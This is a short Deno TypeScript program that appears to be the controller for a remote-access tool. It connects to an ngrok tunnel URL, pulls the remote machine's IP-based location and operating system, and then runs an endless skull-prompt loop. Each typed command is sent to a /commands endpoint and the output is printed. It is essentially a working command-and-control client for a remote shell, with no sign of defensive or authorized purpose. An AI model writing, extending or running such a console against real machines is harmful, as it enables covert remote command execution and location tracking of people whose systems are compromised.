import * as ink from "https://deno.land/x/ink@1.3/mod.ts";

interface IIp {
  status: string,
  country: string,
  countryCode: string,
  region: string,
  regionName: string,
  city: string,
  zip: string,
  lat: number,
  lon: number,
  timezone: string,
  isp: string,
  org: string,
  as: string,
  query: string
}

(async function main() {
  console.log(
    " Type a url like this: https://026f-181-58-226-188.ngrok.io\n",
    await Deno.readTextFile("welcome.txt") + "\n",
    "Version: 0.0.1\n",
    "Type <ctrl + c> to exit.\n"
  );

  const url: string | null = prompt("Enter the ngrok url:");


  if (!url || url.length < 1)
    return console.log("Put a valid URL!");


  const getIp: Response = await fetch(`${url}/ip`, { method: "GET" }),
    ip: IIp = await getIp.json();

  const getOs: Response = await fetch(`${url}/ip/os`, { method: "GET" }),
    os: string = await getOs.text();


  console.log(
    ink.colorize(" <blue>     Connection      </blue>\n"),
    ink.colorize(`<cyan> City:     ${ip.city} </cyan>\n`),
    ink.colorize(`<green> Country:  ${ip.country} </green>\n`),
    ink.colorize(`<magenta> Ip:       ${ip.query} </magenta>\n`),
    ink.colorize(`<yellow> Os:       ${os} </yellow>\n`)
  );

  while (true) {
    const input = prompt(" 💀 >");

    const rawResponse = await fetch(`${url}/commands`, {
      method: "POST",
      headers: {
        Accept: "application/json",
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        command: input,
      }),
    });

    console.log(
      "\n" + await rawResponse.json()
    )
  }
})()